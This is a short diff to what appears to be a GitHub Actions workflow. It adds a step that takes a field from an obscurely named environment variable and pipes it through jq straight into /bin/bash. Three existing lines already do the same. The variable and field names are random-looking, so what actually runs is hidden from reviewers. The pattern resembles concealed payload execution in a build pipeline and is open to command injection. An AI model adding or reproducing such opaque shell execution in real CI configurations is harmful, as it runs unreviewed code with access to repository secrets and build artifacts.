@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$gqdvx7129" | jq -r .mcii4 | /bin/bash
           echo $gwxio4575 | jq -r .vzf06250 | /bin/bash
           echo $tc676 | jq -r .ybtt80 | /bin/bash
+          printf '%s' "$otf90" | jq -r .qq56 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
